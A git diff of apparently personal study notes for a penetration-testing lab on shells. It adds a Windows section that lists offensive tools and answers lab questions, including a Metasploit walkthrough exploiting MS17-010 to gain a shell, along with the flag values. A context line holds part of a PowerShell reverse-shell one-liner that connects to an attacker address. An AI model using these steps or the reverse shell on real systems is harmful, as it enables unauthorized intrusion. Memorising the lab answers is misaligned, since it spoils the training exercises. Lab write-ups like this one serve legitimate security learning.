@@ -5,6 +5,7 @@
     1. [Anatomy of a Shell](#anatomy-of-a-shell)
     2. [Bind Shells](#bind-shells)
     3. [Reverse Shells](#reverse-shells)
+2. [Windows Shell](#windows-shells)
 
 ## Shell Basics
 ### Anatomy of a Shell
@@ -114,3 +115,25 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
     ```
 
     After we on Meterpreter session, we type `shell`. We can explore from there. The answer is `staffsalaries.txt`.
+
+## Windows Shells
+### Tools
+1. MSFVenom & Metasploit-Framework	
+2. [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+3. [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)
+4. [Nishang](https://github.com/samratashok/nishang)
+5. [Darkarmour](https://github.com/bats3c/darkarmour)
+
+### Challenges
+1. What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')
+
+    The answer is `.bat`.
+
+2. What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)
+
+    We can find the answer on the module. The answer is `MS17-010`.
+
+3. Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\
+
+    First we can enumerate using metasploit with `auxiliary/scanner/smb/smb_ms17_010`. Based on the result, we can see its vuln to `MS17-010`. Then we use module `exploit/windows/smb/ms17_010_psexec`. We need to set the RHOSTS and LHOST. After run that, we get the meterpreter session, just type `shell` to get the shell. We can get the flag after that. The answer is `EB-Still-W0rk$`.
+
